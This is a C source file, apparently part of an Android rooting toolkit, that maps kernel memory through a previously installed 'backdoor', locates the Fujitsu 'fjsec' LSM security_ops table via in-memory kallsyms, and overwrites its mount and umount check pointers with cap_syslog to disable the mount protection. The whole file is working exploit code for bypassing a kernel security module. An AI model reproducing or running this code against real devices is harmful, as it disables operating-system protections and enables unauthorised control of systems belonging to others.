#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/system_properties.h>
#define _LARGEFILE64_SOURCE
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "device_database/device_database.h"
#include "backdoor_mmap.h"
#include "libkallsyms/kallsyms_in_memory.h"

#define SECURITY_NAME_MAX       10

#define SECURITY_OPS_OFFSET     ((sizeof (security_ops_tag) + 3) / 4)

#define NUM_SECURITY_OPS        149

#define RESTRICTED_CAP_PREFIX	"fjsec_"
#define DEFAULT_CAP_FUNCTION	"cap_syslog"
#define CHECK_MOUNT_FUNCTION    "fjsec_sb_mount"
#define CHECK_UMOUNT_FUNCTION   "fjsec_sb_umount"

static const char security_ops_tag[SECURITY_NAME_MAX + 1] = "fjsec";

bool
unlock_mount(void)
{
  unsigned long int *security_ops;
  unsigned long int fix_func;
  unsigned long int check_mount_func;
  unsigned long int check_umount_func;
  kallsyms *info;
  int count = 0;
  int i;

  security_ops = memmem((void *)BACKDOOR_MMAP_ADDRESS, BACKDOOR_MMAP_SIZE, security_ops_tag, sizeof security_ops_tag);
  if (security_ops == NULL) {
    printf("security_ops: not found\n");
    return false;
  }

  printf("security_ops = %p\n", backdoor_convert_to_kernel_address(security_ops));

  info = kallsyms_in_memory_init((void *)BACKDOOR_MMAP_ADDRESS, BACKDOOR_MMAP_SIZE);
  if (info == NULL) {
    printf("kallsyms_in_memory_init(): failed\n");
    return false;
  }

  fix_func = kallsyms_in_memory_lookup_name(info, DEFAULT_CAP_FUNCTION);
  if (!fix_func) {
    printf("fix_func <%s>: not found\n", DEFAULT_CAP_FUNCTION);
    return false;
  }

  check_mount_func = kallsyms_in_memory_lookup_name(info, CHECK_MOUNT_FUNCTION);
  if (!check_mount_func) {
    printf("check_mount_func <%s>: not found\n", CHECK_MOUNT_FUNCTION);
  }

  check_umount_func = kallsyms_in_memory_lookup_name(info, CHECK_UMOUNT_FUNCTION);
  if (!check_umount_func) {
    printf("check_umount_func <%s>: not found\n", CHECK_UMOUNT_FUNCTION);
  }

  for (i = SECURITY_OPS_OFFSET; i < SECURITY_OPS_OFFSET + NUM_SECURITY_OPS; i++) {
    if (security_ops[i]) {
      const char *name = kallsyms_in_memory_lookup_address(info, security_ops[i]);
      if (!name) {
        break;
      }

      if ((check_mount_func && security_ops[i] == check_mount_func)
       || (check_umount_func && security_ops[i] == check_umount_func)) {
        security_ops[i] = (unsigned long int)fix_func;
        count++;
      }
    }
  }

  printf("  %d functions are fixed.\n", count);

  //kallsyms_in_memory_free(info);

  return count > 0;
}

static bool
do_unlock(void)
{
  bool ret;

  if (!backdoor_open_mmap()) {
    printf("Failed to mmap due to %s.\n", strerror(errno));
    printf("Run 'install_backdoor' first\n");

    return false;
  }

  ret = unlock_mount();

  backdoor_close_mmap();
  return ret;
}

int
main(int argc, char **argv)
{
  if (!do_unlock()) {
    printf("Failed to unlock LSM protect.\n");
    exit(EXIT_FAILURE);
  }

  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
